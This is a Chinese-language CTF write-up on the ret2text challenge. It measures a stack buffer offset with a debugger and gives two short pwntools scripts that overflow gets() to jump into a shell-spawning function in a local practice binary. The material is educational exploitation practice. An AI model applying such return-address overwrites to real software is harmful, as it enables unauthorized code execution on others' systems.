ailx10说：这篇是在2024年4月之前写的，后来又改过。ret2text 这题里，程序本来有一段随机数判断，但我注意到目标代码已经放在现成的函数里，于是试着让返回地址直接落到那一段，而不是老老实实走完整个条件。接下来就是在 gets 调用处看 esp、ebp，算缓冲区到返回地址的距离，再调整输入。这篇把那个一百多字节的偏移怎样量出来也保留了。它是一次沿着既有代码找落点的练习，地址和距离都来自当时的二进制，换一个样本或编译环境，还是得重新看，不能把数字当口诀背。

---

ret2text 指将返回地址改为已有代码段中的位置。该位置可以位于函数内部，但能否正常运行仍取决于进入时的栈、寄存器和其他状态。

原题使用随机数条件；作者在特定样本中尝试跳过检查，不能据此推广为任意程序的分支均无需参数或状态。

（1）拿到题目，先玩一下，是让你猜东西，猜对了，就拿到shell，猜不对，程序就结束了

![](/notes-assets/bfa94f48aca97c50926b.webp)

（2）只有栈不可执行保护

![](/notes-assets/360bfbba39341f600832.webp)

（3）原样本中可观察到输入越界可能覆盖 main 的返回地址；返回地址与函数返回值是不同概念。

![](/notes-assets/089b6f03f54958e87993.webp)

（4）发现secure函数，可以获得shell权限，前提是要让输入的数字等于随机数，但是这几乎不可能

![](/notes-assets/79f418cca01e7daccc35.webp)

（5）如果我们的main函数返回跳转到secure函数内部的**0804863A**位置，也能直接获得shell

![](/notes-assets/15fe119bb648531991bc.webp)

（6）确定输入缓冲区起始位置与 main 保存的返回地址之间的距离。

- `lea` 指令是 Load Effective Address 的缩写，用于计算内存地址
- `lea eax, [esp+1Ch]`计算了地址 `esp + 0x1C` 的值，并将结果存储在寄存器 `eax` 中
- 然后将`eax` 寄存器中的值复制到栈顶 (`esp`) 的位置
- 最后`_gets` 读取用户输入的字符串，并将其存储到 `esp + 0x1C`

![](/notes-assets/d6e377f3b59b7edc0254.webp)

（7）断点到`call _gets`，查看寄存器信息

- esp 0xffffd4f0
- ebp 0xffffd578

![](/notes-assets/f8d3b61ce6b1ad830592.webp)

（8）因此，可以推断出用户输入的字符串存储的位置，与ebp的距离是0x6C

![](/notes-assets/4c2ab2359a1fbba139db.webp)

（9）在VPS本地，基于Python3的pwntools来写一个溢出利用，成功改变了函数执行流，getshell

![](/notes-assets/090a94c7f76bf660771b.webp)

```
# python3



from pwn import *



sh = process('./ret2text')

target = 0x804863a

sh.sendline(b'A' * (0x6c + 4) + p32(target))

sh.interactive()
```

（10）原文也尝试重复目标地址作为填充；这是样本特定的容错尝试，不能替代精确测量偏移和执行条件。

![](/notes-assets/ae21e45e49475b9d76b7.webp)

```
# python3



from pwn import *



sh = process('./ret2text')

target = 0x804863a

sh.sendline(b'A' * (0x64 + 4) + p32(target)*30)

sh.interactive()
```

这次走的是已有代码路径，不是让输入凭空生出功能。把目标位置和栈布局都找到依据，ret2text才不只是一个题型名，而是一次具体的返回路径安排。
